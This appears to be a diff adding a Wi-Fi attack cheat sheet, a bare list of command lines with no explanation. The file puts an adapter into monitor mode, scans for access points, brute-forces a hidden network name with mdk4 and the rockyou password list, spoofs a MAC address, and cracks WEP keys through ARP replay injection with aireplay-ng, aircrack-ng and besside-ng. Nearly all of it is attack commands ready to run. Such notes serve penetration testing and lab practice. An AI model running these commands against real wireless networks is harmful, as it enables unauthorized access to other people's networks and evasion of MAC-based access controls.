@@ -1,0 +1,30 @@
+airmon-ng check kill
+airmon-ng start wlan0
+
+=== SCANNING ===
+airodump-ng wlan0mon -w ~/airodump/scan --manufacturer --wps --band abg
+airodump-ng wlan0mon -w ~/airodump/scan --manufacturer --wps -c11  # scan specified channel
+
+=== BRUTEFORCE ESSID (HIDDEN AP) ===
+tar -xvf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz -C .
+cat rockyou.txt | awk '{print "wifi-" $1}' > wifi-rockyou.txt
+iwconfig wlan0mon channel $CHANNEL
+mdk4 wlan0mon p -t $ESSID -f wifi-rockyou.txt
+
+=== CHANGE MAC ===
+systemctl stop network-manager
+ip link set wlan2 down
+macchanger -m $MAC wlan2
+ip link set wlan2 up
+
+=== CONNECT TO NETWORK ===
+wpa_supplicant -Dnl80211 -iwlan2 -c $CONFIGURATION_FILE
+dhclient wlan2 -v
+
+=== CRACKING WEP ===
+airodump-ng -c $CHANNEL --bssid $BSSID -w ~/airodump/wifi-old wlan0mon
+aireplay-ng -1 3600 -q 10 -a $BSSID wlan0mon
+aireplay-ng -3 -b $BSSID -h BA:49:A9:53:A1:8C wlan0mon
+aircrack-ng ~/airodump/wifi-old-01.cap
+
+besside-ng -c 1 -b F0:9F:C2:AA:19:29 wlan2 -v
